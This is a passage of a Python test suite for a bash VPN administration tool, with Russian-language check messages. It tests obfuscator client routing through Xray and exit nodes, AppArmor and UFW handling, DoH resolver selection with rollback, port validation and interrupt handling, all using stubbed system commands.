rc, out, _ = bash('WGOBF_FW=/usr/local/lib/awg2/wgobf-fw.sh; _wgobf_apparmor; [[ -e "$WGOBF_AA_DIR/local/wg-quick" ]] && echo MADE || echo NONE')
chk("профиля wg-quick нет — AppArmor не трогаем", out.strip().endswith("NONE") and "apparmor_parser" not in calls(), [out, calls()])
os.makedirs(os.path.join(AA, "local"), exist_ok=True)
with open(os.path.join(AA, "wg-quick"), "w") as f:
    f.write("profile wg-quick /usr/bin/wg-quick {\n  include if exists <local/wg-quick>\n}\n")
with open(AAL, "w") as f:
    f.write("# своё\nfile r /etc/my-hook.conf,\n")
reset_calls()
rc, out, _ = bash('WGOBF_FW=/usr/local/lib/awg2/wgobf-fw.sh; _wgobf_apparmor; _wgobf_apparmor')
loc = open(AAL).read()
chk("профиль wg-quick есть — скрипт правил wgobf0 разрешён в local/wg-quick, своё на месте, профиль перечитан один раз",
    "file PUx /usr/local/lib/awg2/wgobf-fw.sh," in loc and loc.startswith("# своё\nfile r /etc/my-hook.conf,\n")
    and loc.count("awg2-wgobf: begin") == 1 and calls().count("apparmor_parser -r") == 1
    and os.path.join(AA, "wg-quick") in calls(), [loc, calls()])
reset_calls()
rc, out, _ = bash('_wgobf_apparmor drop')
loc = open(AAL).read()
chk("удаление обфускатора — свой блок убран, чужие строки остались, профиль перечитан",
    loc == "# своё\nfile r /etc/my-hook.conf,\n" and calls().count("apparmor_parser -r") == 1, [loc, calls()])
with open(os.path.join(AA, "wg-quick"), "w") as f:
    f.write("profile wg-quick /usr/bin/wg-quick {\n}\n")
os.remove(AAL)
rc, out, err = bash('_wgobf_apparmor')
chk("профиль без local/wg-quick — предупреждение, файл не создаём", not os.path.exists(AAL) and "local/wg-quick" in out + err, [out, err])
os.remove(os.path.join(AA, "wg-quick"))

print("\n── WG + обфускатор: свой маршрут клиента — Xray и exit-ноды ──")
XCONF = os.path.join(ROOT, "etc/xray/config.json")
xconf_was = open(XCONF).read() if os.path.exists(XCONF) else None
fake_xray(tun=True)
os.makedirs(os.path.dirname(XCONF), exist_ok=True)
with open(XCONF, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun-in", "settings": {"name": "xray0"}}],
               "outbounds": [{"protocol": "vless", "tag": "A"}, {"protocol": "vless", "tag": "B"},
                             {"protocol": "freedom", "tag": "direct"}],
               "routing": {"rules": [{"type": "field", "inboundTag": ["tun-in"], "outboundTag": "A"}]}}, f)
for n in ("p1", "p2"):
    open(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf"), "w").close()
st = api("wgobf", "status").get("data") or {}
chk("api wgobf status: туннели на выбор — Xray с выходами (умеет tun), exit-ноды",
    st.get("xray") in ("off", "up") and st.get("xray_tags") == ["A", "B"] and st.get("exits") in ("off", "up")
    and {"p1", "p2"} <= set(st.get("exit_nodes") or []), st)
# Xray поднят в режиме tun: свой выход клиента — правило в конфиге Xray и перезапуск
WSTUB = 'xray_restart() { echo XRAY-RESTART; }; exits_reapply() { echo EXITS-REAPPLY; }; '
with open(LINKS, "w") as f:
    f.write("xray0\n")
with open(os.path.join(ROOT, "etc/xray/state"), "w") as f:
    f.write("active\ntun_mode=native\n")
reset_calls()
rc, out, _ = bash(WSTUB + 'wgobf_route_set wa xray:A; echo "--"; cat "$XRAY_PEERS.wgobf"')
xr = [r for r in json.load(open(XCONF))["routing"]["rules"] if r.get("source")]
chk("клиент обфускатора → свой выход Xray: список, правило по адресу в конфиге, перезапуск, без NAT в xray0",
    rc == 0 and "XRAY-RESTART" in out and out.split("--")[1].split() == ["10.66.66.2|A"]
    and any(r.get("source") == ["10.66.66.2"] and r.get("outboundTag") == "A" for r in xr)
    and "ip rule add from 10.66.66.2 lookup 201 priority 201" in calls()
    and "-t nat -I POSTROUTING 1 -s 10.66.66.0/24 -o xray0 -j RETURN" in calls() and "EXITS-REAPPLY" not in out,
    [out, xr, calls()])
rc, out, _ = bash(WSTUB + 'wgobf_route_set wa xray:A; echo "--"; wgobf_route_set wa xray; echo "--"; wgobf_route_set wa xray')
parts = out.split("--")
chk("тот же выход — без перезапуска; на выход по умолчанию — перезапуск один раз, дальше без него",
    rc == 0 and len(parts) == 3 and "XRAY-RESTART" not in parts[0] and "XRAY-RESTART" in parts[1]
    and "XRAY-RESTART" not in parts[2], out)
rc, out, _ = bash(WSTUB + 'wgobf_route_set wb exits:p2; echo "--"; cat "$EXITS_PEERS.wgobf"; echo "--"; wgobf_route_set wb exits:p2')
parts = out.split("--")
chk("клиент обфускатора → своя exit-нода: список, маршрутизация нод перезапускается, повтор — без перезапуска",
    rc == 0 and "EXITS-REAPPLY" in parts[0] and parts[1].split() == ["10.66.66.3|p2"] and "EXITS-REAPPLY" not in parts[2], out)
# Exit-ноды работают: тот же выход повторно не снимает правило клиента (список тот же — перезапуска нод
# нет, и вернуть его было бы некому), потерянное правило возвращается без перезапуска, стоящее — не дублируется
links_was, active_was = open(LINKS).read(), open(ACTIVE).read()
with open(LINKS, "a") as f:
    f.write("awg-exit-p2\n")
with open(ACTIVE, "a") as f:
    f.write("awg-exits-routing.service\n")
reset_calls()
rc, out, _ = bash(WSTUB + 'wgobf_route_set wb exits:p2 2>&1')
chk("exit-нода выбрана повторно — правило клиента не снимается и на месте, без перезапуска нод",
    rc == 0 and "EXITS-REAPPLY" not in out and "ip rule del from 10.66.66.3" not in calls()
    and re.search(r"ip rule add from 10\.66\.66\.3 lookup 21\d priority 202", calls()), [out, calls()])
reset_calls()
rc, out, _ = bash(WSTUB + '_wgobf_route_refresh "$(_xray_outs)" "$(sort "$EXITS_PEERS.wgobf")"')
chk("правило клиента exit-ноды потеряно — возвращается в таблицу его ноды, без перезапуска нод",
    "EXITS-REAPPLY" not in out and re.search(r"ip rule add from 10\.66\.66\.3 lookup 21\d priority 202", calls()), [out, calls()])
reset_calls()
rc, out, _ = bash(WSTUB + 'ip() { if [[ "$1 $2" == "rule show" ]]; then printf "202:\\tfrom 10.66.66.3 lookup 211\\n"; '
                  'else command ip "$@"; fi; }; _wgobf_route_refresh "$(_xray_outs)" "$(sort "$EXITS_PEERS.wgobf")"')
chk("правило клиента exit-ноды на месте — второе не ставится", "from 10.66.66.3" not in calls(), calls())
open(LINKS, "w").write(links_was)
reset_calls()
rc, out, _ = bash(WSTUB + '_wgobf_route_refresh "$(_xray_outs)" "$(sort "$EXITS_PEERS.wgobf")"')
chk("нода клиента лежит — правило на общий выход exit-нод, а не в пустоту",
    "ip rule add from 10.66.66.3 lookup 202 priority 202" in calls(), calls())
open(ACTIVE, "w").write(active_was)
reset_calls()
rc, out, _ = bash(WSTUB + '_wgobf_route_refresh "$(_xray_outs)" "$(sort "$EXITS_PEERS.wgobf")"')
chk("exit-ноды выключены — правил клиенту exit-нод не ставим", "ip rule add from 10.66.66.3" not in calls(), calls())
rc, out, _ = bash(WSTUB + 'SERVER_CONF="$SERVER_CONF.none"; wgobf_route_set wb exits 2>&1; echo "rc=$?"; '
                  'wgobf_route_of 10.66.66.3; wgobf_route_set wb direct >/dev/null 2>&1; echo "rc=$?"; '
                  'echo 0 | _wgobf_route_pick 2>&1')
chk("сервера AWG нет (только обфускатор) — выход в туннель не принимается с понятной причиной, напрямую — можно",
    "сервером AWG" in out.split("rc=1")[0] and "rc=1\nexits:p2\nrc=0" in out
    and "exit-нод" not in out.split("rc=0")[1], out)
bash(WSTUB + 'wgobf_route_set wb exits:p2 >/dev/null 2>&1')
r1 = api("wgobf", "route", "wb", "exits:zz")
r2 = api("wgobf", "route", "wb", "xray:Q")
rows = {x["name"]: x for x in api("wgobf", "clients").get("data") or []}
chk("нет ноды или выхода Xray — отказ; в clients — маршрут каждого",
    r1.get("ok") is False and "Ноды zz нет" in r1.get("error", "") and r2.get("ok") is False
    and "Выхода Xray Q нет" in r2.get("error", "") and rows.get("wa", {}).get("route") == "xray"
    and rows.get("wb", {}).get("route") == "exits:p2", [r1, r2, rows])
rc, out, _ = bash('_wgobf_sync() { :; }; wgobf_write_bundle() { :; }; wgobf_add_client all >/dev/null 2>&1; echo "rc=$?"; wgobf_clients | grep -cx all || true')
chk("клиент обфускатора с именем all не создаётся: в «wgobf route» так зовутся все клиенты", out.split() == ["rc=1", "0"], out)
rc, out, _ = bash(WSTUB + 'wgobf_route_set wa xray:B >/dev/null; _xray_peers_untag B; cat "$XRAY_PEERS.wgobf"')
chk("выход Xray удалён — клиент обфускатора на выходе по умолчанию",
    len(out.split()) == 2 and int(out.split()[0]) >= 1 and out.split()[1] == "10.66.66.2", out)
rc, out, _ = bash(WSTUB + 'exits_node_del p2 >/dev/null; : > "$EXITS_DIR/awg-exit-p3.conf"; cat "$EXITS_PEERS.wgobf"')
chk("нода удалена — клиент обфускатора на общем выходе", out.split() == ["10.66.66.3"], out)
rc, out, _ = bash(WSTUB + '_wgobf_sync() { :; }; wgobf_write_bundle() { :; }; '
                  'wgobf_route_set all exits:p1 >/dev/null; wgobf_get ROUTE; wgobf_add_client wc >/dev/null 2>&1; '
                  'rm -f "$EXITS_DIR/awg-exit-p1.conf"; wgobf_add_client wd >/dev/null 2>&1; cat "$EXITS_PEERS.wgobf"; '
                  'echo "--"; cat "$XRAY_PEERS.wgobf"; echo "--"; wgobf_route_of 10.66.66.5')
chk("новые клиенты — за всеми (exits:p1); ноды уже нет — общий выход exit-нод; в одном списке за раз",
    out.split() == ["exits:p1", "10.66.66.2|p1", "10.66.66.3|p1", "10.66.66.4|p1", "10.66.66.5", "--", "--", "exits"], out)
rc, out, _ = bash('_backup_tunnel_paths; printf "%s\n" "${_BACKUP_TUNNEL_PATHS[@]}"')
chk("бэкап туннелей — со списком exit-нод клиентов обфускатора", "exits_peers.list.wgobf" in out, out)
rc, out, _ = bash(WSTUB + '_wgobf_routes_clear; ls "$EXITS_PEERS.wgobf" "$XRAY_PEERS.wgobf" 2>&1 | grep -c "No such"')
chk("обфускатор удалён — списки Xray и exit-нод его клиентов убраны, маршрутизация нод перезапущена",
    out.split() == ["EXITS-REAPPLY", "2"], out)
os.remove(os.path.join(ROOT, "etc/xray/state"))
open(LINKS, "w").close()
for n in ("p1", "p2", "p3"):
    if os.path.exists(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf")):
        os.remove(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf"))
if xconf_was is None:
    os.remove(XCONF)
else:
    with open(XCONF, "w") as f:
        f.write(xconf_was)
with open(os.path.join(ROOT, "etc/wireguard/wgobf0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\n\n[Peer]\n# client=wa\nPublicKey = WAPUB=\nAllowedIPs = 10.66.66.2/32\n\n"
            "[Peer]\n# client=wb\nPublicKey = WBPUB=\nAllowedIPs = 10.66.66.3/32\n")
bash('wgobf_set ROUTE direct')

r = api("traffic", "now")
d = r.get("data") or {}
chk("api traffic now — клиенты обфускатора отдельно (wpeers): живая скорость считает и их",
    r.get("ok") and d.get("wpeers") == {"wa": [5000, 7000]} and "wa" not in (d.get("peers") or {}), r)
os.remove(WG_DUMP)

print("\n── Проверка новой версии: бета — раз в 20 минут, стабильный — раз в час ──")
PEEK = 'update_peek() { touch "$STATE_DIR/peeked"; }; rm -f "$STATE_DIR/peeked"; '
for chan, age, want in (("beta", 1300, True), ("beta", 600, False), ("stable", 1300, False), ("stable", 3700, True)):
    rc, out, _ = bash(PEEK + f'update_channel_apply {chan}; echo "v1.0.0 $(( $(date +%s) - {age} ))" > "$UPDATE_CACHE"; '
                      'unset AWG_NO_UPDATE_CHECK; update_check_async; sleep 0.3; [[ -e "$STATE_DIR/peeked" ]] && echo PEEK || echo SKIP')
    chk(f"{chan}: прошлой проверке {age // 60} мин — {'проверяет' if want else 'ещё рано'}",
        out.strip().endswith("PEEK" if want else "SKIP"), out)

print("\n── Резолверы шифрованного DNS: только DoH по IPv4, откат, если не поднялся ──")


def _stamp(proto, addr):
    b = bytes([proto]) + (7).to_bytes(8, "little") + bytes([len(addr)]) + addr.encode() + b"\x00"
    return "sdns://" + base64.urlsafe_b64encode(b).decode().rstrip("=")


RES_MD = os.path.join(ROOT, "var/cache/dnscrypt-proxy/public-resolvers.md")
os.makedirs(os.path.dirname(RES_MD), exist_ok=True)
with open(RES_MD, "w") as f:
    f.write("# public-resolvers\n\n")
    for name, proto, addr in (("cloudflare", 2, "1.0.0.1"), ("google", 2, "8.8.8.8"), ("adguard-dns", 1, "94.140.14.14:5443"),
                              ("adguard-dns-doh", 2, "94.140.14.14"), ("dns.sb", 2, "185.222.222.222"),
                              ("mullvad-doh-ipv6", 2, "[2a07:e340::2]"), ("mullvad-doh", 2, "194.242.2.2")):
        f.write(f"## {name}\n\nописание\n\n{_stamp(proto, addr)}\n\n")
DNSC = os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")
os.makedirs(os.path.dirname(DNSC), exist_ok=True)
FAKE_RESTART = ('dns_restart() { echo restart >> "$STATE_DIR/dns_restarts"; '
                '! grep -q "google" "$DNS_PROXY_CONF"; }; rm -f "$STATE_DIR/dns_restarts"; ')


def dns_conf(names="'cloudflare'"):
    with open(DNSC, "w") as f:
        f.write(f"listen_addresses = []\nserver_names = [{names}]\nrequire_nofilter = true\ndoh_servers = true\n")


def dns_names():
    with open(DNSC) as f:
        return re.search(r"^server_names = (.*)$", f.read(), re.M).group(1)


dns_conf()
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream adguard-dns")
chk("DNSCrypt-имя не записано, подсказка — DoH-вариант", rc != 0 and dns_names() == "['cloudflare']"
    and "adguard-dns-doh" in out + err and "DoH" in out + err, out + err)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream mullvad-doh-ipv6")
chk("только IPv6 — не записано, подсказка — IPv4-вариант", rc != 0 and "mullvad-doh" in out + err
    and dns_names() == "['cloudflare']", out + err)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream adgaurd-dns-doh")
chk("опечатка — «нет в списке» и похожее имя", rc != 0 and "нет в списке" in out + err and "adguard-dns-doh" in out + err, out + err)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream 'dns.sb,adguard-dns-doh'")
chk("имя с точкой и DoH-вариант — записаны", rc == 0 and dns_names() == "['dns.sb', 'adguard-dns-doh']", out + err)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream 'cloudflare google'")
chk("служба не поднялась — прежние резолверы вернулись", rc != 0 and dns_names() == "['dns.sb', 'adguard-dns-doh']"
    and "вернул прежние" in out + err, out + err)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream 'cloud*'")
chk("звёздочка и прочее — отказ до записи", rc != 0 and dns_names() == "['dns.sb', 'adguard-dns-doh']", out + err)
os.remove(RES_MD)
rc, out, err = bash(FAKE_RESTART + "dns_set_upstream mullvad-doh-ipv6")
chk("списка ещё нет — имя проверит перезапуск", rc == 0 and dns_names() == "['mullvad-doh-ipv6']", out + err)
rc, out, _ = bash('popular() { for i in "${DNS_POPULAR[@]}"; do echo "${i%%|*}"; done; }; popular')
chk("подсказка «Популярные» — 10 имён", len(out.split()) == 10 and "adguard-dns-doh" in out.split(), out)

print("\n── UFW: русская локаль, порты awg0 и обфускатора, политика FORWARD, починка ──")
UFWR = os.path.join(TMP, "ufw-active-rules")
UFWD = os.path.join(ROOT, "etc/default/ufw")
os.makedirs(os.path.dirname(UFWD), exist_ok=True)
open(UFWR, "w").close()
# ufw как на русской локали: статус переведён; правила — в файле, allow/delete его правят
UFWS = r"""ufw() { echo "ufw $*" >> "$CALLS"
  case "$1" in
    status)
      if [[ "${LC_ALL:-}" == C ]]; then echo "Status: active"; else echo "Состояние: активен"; fi
      if [[ "${2:-}" == numbered ]]; then awk '{printf "[%2d] %s\n", NR, $0}' "@R@"; else cat "@R@"; fi ;;
    allow) grep -qF -- "$2 " "@R@" || printf '%-26s ALLOW IN    Anywhere                   # %s\n' "$2" "$4" >> "@R@" ;;
    --force) sed -i "${3}d" "@R@" ;;
  esac
  return 0
}
""".replace("@R@", UFWR)
WOV = (f'WGOBF_DIR="{TMP}/wgobf-ufw"; WGOBF_STATE="$WGOBF_DIR/state"; WGOBF_OBF_CONF="$WGOBF_DIR/obfuscator.conf"; '
       f'WGOBF_WG_CONF="$WGOBF_DIR/wgobf0.conf"; WGOBF_CLIENTS="$WGOBF_DIR/clients"; WGOBF_LIB="$WGOBF_DIR/lib"; '
       'WGOBF_BIN="$WGOBF_LIB/wg-obfuscator"; WGOBF_FW="$WGOBF_LIB/wgobf-fw.sh"; '
       '_wgobf_prepare() { :; }; wgobf_restart() { :; }; web_vpn_changed() { :; }; ')


def ufw_defaults(policy):
    with open(UFWD, "w") as f:
        f.write(f'IPV6=yes\nDEFAULT_INPUT_POLICY="DROP"\nDEFAULT_FORWARD_POLICY="{policy}"\nMANAGE_BUILTINS=no\n')


def ufw_rules():
    with open(UFWR) as f:
        return f.read()


rc, out, _ = bash(UFWS + 'LC_ALL= ufw status | head -1; ufw_active && echo ACTIVE')
chk("ufw на русской локали («Состояние: активен») — Тулза видит, что он включён",
    out.startswith("Состояние: активен") and "ACTIVE" in out, out)
ufw_defaults("DROP")
reset_calls()
rc, out, err = bash(UFWS + WOV + "wgobf_install_opts endpoint=203.0.113.10 port=40555 masking=STUN client= 2>&1")
chk("установка обфускатора при включённом UFW — порт открыт с меткой, FORWARD=ACCEPT, об этом сказано",
    rc == 0 and "40555/udp" in ufw_rules() and "# awg-wgobf" in ufw_rules() and "UFW: открыт 40555/udp" in out
    and 'DEFAULT_FORWARD_POLICY="ACCEPT"' in open(UFWD).read() and "ufw reload" in calls(), [out[-500:], err[-300:], ufw_rules()])
reset_calls()
rc, out, _ = bash(UFWS + WOV + f'API_DATA="{TMP}/api-wgobf.json"; _api_wgobf status >/dev/null 2>&1; cat "$API_DATA"')
try:
    chk("api wgobf status: ufw=open", json.loads(out).get("ufw") == "open", out[-300:])
except ValueError:
    chk("api wgobf status: ufw=open", False, out[-300:])
n = calls().count("ufw status")
chk("api wgobf status — ufw запускается один раз (он медленный, на Python)", n == 1, n)
# UFW включили после установки (правил на порты нет, FORWARD снова DROP), правила wgobf0 снесены
open(UFWR, "w").close()
ufw_defaults("DROP")
links_saved = open(LINKS).read()
with open(LINKS, "a") as f:
    f.write("wgobf0\n")
reset_calls()
rc, out, _ = bash(UFWS + WOV + "AUTO_MODE=1; do_repair 2>&1")
aport = bash("server_port")[1].strip()
chk("«Проверить и починить»: открывает порты AWG и обфускатора, FORWARD=ACCEPT, возвращает правила wgobf0",
    f"UFW: открыт {aport}/udp" in out and "UFW: открыт 40555/udp" in out and "DEFAULT_FORWARD_POLICY=ACCEPT" in out
    and "Правила wgobf0 восстановлены" in out and "-I FORWARD 1 -i wgobf0 -j ACCEPT" in calls()
    and f"{aport}/udp" in ufw_rules() and "40555/udp" in ufw_rules(), out[-900:])
rc, out, _ = bash(UFWS + WOV + 'iptables() { for a in "$@"; do [[ "$a" == -C ]] && return 0; done; command iptables "$@"; }; '
                  "AUTO_MODE=1; do_repair 2>&1")
chk("всё открыто и правила на месте — замечаний по файрволу нет",
    "порт обфускатора 40555/udp открыт" in out and f"порт AWG {aport}/udp открыт" in out
    and "закрыт" not in out and "Нет правил файрвола" not in out and "FORWARD — DROP" not in out, out[-900:])
rc, out, _ = bash(UFWS + WOV + "wgobf_status 2>&1")
chk("статус обфускатора — строка UFW: порт открыт", "UFW" in out and "порт открыт" in out, out)
rc, out, _ = bash(UFWS + WOV + "_wgobf_teardown drop 2>&1; echo rc=$?")
chk("удаление обфускатора снимает его правило UFW, чужие остаются",
    "rc=0" in out and "40555/udp" not in ufw_rules() and f"{aport}/udp" in ufw_rules(), [out[-300:], ufw_rules()])
open(LINKS, "w").write(links_saved)
shutil.rmtree(os.path.join(TMP, "wgobf-ufw"), ignore_errors=True)

print("\n── Порт AWG и обфускатора: 443 (QUIC) или 1024-65535 ──")
rc, out, _ = bash('for p in 443 1024 51820 65535 80 53 123 1023 0 65536 0443 44x; do '
                  'awg_port_ok "$p" && printf "+%s " "$p" || printf -- "-%s " "$p"; done')
chk("443 и 1024-65535 — можно; 80, 53, 123, 1023, 0, 65536, 0443 и мусор — нет",
    out.split() == ["+443", "+1024", "+51820", "+65535", "-80", "-53", "-123", "-1023", "-0", "-65536", "-0443", "-44x"], out)
rc, out, _ = bash("server_create_ready() { return 0; }; server_create_opts port=80 2>&1; echo rc=$?")
chk("api server create port=80 — отказ с подсказкой про 443", "port: 443 или 1024-65535" in out and "rc=1" in out, out[-300:])
rc, out, _ = bash("server_create_ready() { return 0; }; udp_listening() { [[ $1 == 443 ]]; }; "
                  "server_create_opts port=443 2>&1; echo rc=$?")
chk("api server create port=443 — проходит проверку, занятый 443 (HTTP/3 у веб-сервера) — отказ",
    "UDP 443 занят" in out and "rc=1" in out and "1024-65535" not in out, out[-300:])
rc, out, _ = bash("wgobf_installed() { return 1; }; wgobf_install_opts port=1023 2>&1; echo rc=$?")
chk("api wgobf install port=1023 — отказ с подсказкой про 443", "port: 443 или 1024-65535" in out and "rc=1" in out, out[-300:])

print("\n── Ctrl+C: выход от сигнала — в «awg2.sh; awg-bot-install.sh» вторая команда не запускается ──")
rc, out, _ = bash("trap '_on_interrupt INT' INT; kill -INT $$; sleep 1; echo AFTER")
chk("Ctrl+C в меню — «Прервано» и смерть от SIGINT, а не exit 130", rc == -2 and "Прервано" in out and "AFTER" not in out, (rc, out))
chk("TERM — смерть от SIGTERM", bash("trap '_on_interrupt TERM' TERM; kill -TERM $$; echo AFTER")[0] == -15)

summary()
